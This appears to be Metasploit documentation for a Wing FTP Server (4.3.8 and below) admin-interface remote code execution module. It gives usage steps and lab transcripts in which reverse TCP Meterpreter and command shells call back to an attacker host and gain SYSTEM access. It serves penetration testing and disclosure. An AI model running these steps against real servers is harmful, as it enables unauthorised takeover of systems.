## Description

This module exploits the embedded Lua interpreter in the admin web interface for versions 4.3.8 and below. When supplying a specially crafted HTTP POST request an attacker can use os.execute() to execute arbitrary system commands on the target with SYSTEM privileges.

## Vulnerable application

Wing FTP Server <= 4.3.8

## Verification Steps
    1. Start `msfconsole`
    2. Do `use exploit/windows/ftp/wing_ftp_admin_exec`
    3. Do `set RHOST <target-ip>`
    4. Do `set USERNAME <valid-username>`
    5. Do `set PASSWORD <valid-password>`
    6. Optional: Do `set PAYLOAD windows/<your-preferred-shell>` (default is `windows\meterpreter\reverse_tcp`)
    7. Do `set LHOST <your-ip>`
    8. Optional: Do `set TARGET <target>` to specify whether PowerShell/CmdStager will be used (default is `PowerShell`)
    9. Do `exploit`
    10. Verify that a shell of your specified type (Meterpreter, plain old shell, etc.) pops

## Tested with Wing FTP Server 4.3.8 on Windows Server 2016 Datacenter x64

### With PowerShell using x64/meterpreter ###
```
msf > use exploit/windows/ftp/wing_ftp_admin_exec 
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD 5up3r53kr3tp@$$w0rd
PASSWORD => 5up3r53kr3tp@$$w0rd
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[*] Executing payload via Powershell...
[*] Sending stage (206403 bytes) to 192.168.136.151
[*] Meterpreter session 1 opened (192.168.136.146:4444 -> 192.168.136.151:1616) at 2018-12-07 02:43:10 +0800

meterpreter > sysinfo
Computer        : 2K16DTCTR
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

### with PowerShell using shell_reverse_tcp ###


```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD 5up3r53kr3tp@$$w0rd
PASSWORD => 5up3r53kr3tp@$$w0rd
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[*] Executing payload via Powershell...
[*] Command shell session 2 opened (192.168.136.146:4444 -> 192.168.136.151:1623) at 2018-12-07 02:45:32 +0800


C:\Windows\system32>whoami & hostname & ipconfig
whoami & hostname & ipconfig
nt authority\system
2K16DTCTR

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::8cb0:9bf1:fefe:5fbd%14
   IPv4 Address. . . . . . . . . . . : 192.168.136.151
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.136.2

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6abd:ced:1cd7:3f57:7768
   Link-local IPv6 Address . . . . . : fe80::ced:1cd7:3f57:7768%18
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : localdomain

C:\Windows\system32>

```

### with CmdStager using x64/meterpreter ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD 5up3r53kr3tp@$$w0rd
PASSWORD => 5up3r53kr3tp@$$w0rd
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > set TARGET CmdStager 
TARGET => CmdStager
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[*] Sending payload
[*] Command Stager progress -  12.42% done (1499/12068 bytes)
[*] Command Stager progress -  24.84% done (2998/12068 bytes)
[*] Command Stager progress -  37.26% done (4497/12068 bytes)
[*] Command Stager progress -  49.69% done (5996/12068 bytes)
[*] Command Stager progress -  62.11% done (7495/12068 bytes)
[*] Command Stager progress -  74.53% done (8994/12068 bytes)
[*] Command Stager progress -  86.53% done (10442/12068 bytes)
[*] Command Stager progress -  98.75% done (11917/12068 bytes)
[*] Sending stage (206403 bytes) to 192.168.136.151
[*] Command Stager progress - 100.00% done (12068/12068 bytes)
[*] Meterpreter session 3 opened (192.168.136.146:4444 -> 192.168.136.151:1631) at 2018-12-07 02:49:01 +0800

meterpreter > sysinfo
Computer        : 2K16DTCTR
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

### With CmdStager using shell_reverse_tcp ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD 5up3r53kr3tp@$$w0rd
PASSWORD => 5up3r53kr3tp@$$w0rd
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > set TARGET CmdStager 
TARGET => CmdStager
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[*] Sending payload
[*] Command Stager progress -   1.47% done (1499/102292 bytes)
[*] Command Stager progress -   2.93% done (2998/102292 bytes)
[*] Command Stager progress -   4.40% done (4497/102292 bytes)
[*] Command Stager progress -   5.86% done (5996/102292 bytes)
[*] Command Stager progress -   7.33% done (7495/102292 bytes)
[*] Command Stager progress -   8.79% done (8994/102292 bytes)
[*] Command Stager progress -  10.26% done (10493/102292 bytes)
<... snip ...>
[*] Command Stager progress -  99.55% done (101827/102292 bytes)
[*] Command Stager progress - 100.00% done (102292/102292 bytes)
[*] Command shell session 4 opened (192.168.136.146:4444 -> 192.168.136.151:1639) at 2018-12-07 02:52:10 +0800


C:\Windows\system32>whoami & hostname & ipconfig
whoami & hostname & ipconfig
nt authority\system
2K16DTCTR

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::8cb0:9bf1:fefe:5fbd%14
   IPv4 Address. . . . . . . . . . . : 192.168.136.151
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.136.2

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6abd:ced:1cd7:3f57:7768
   Link-local IPv6 Address . . . . . : fe80::ced:1cd7:3f57:7768%18
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : localdomain

C:\Windows\system32>
```
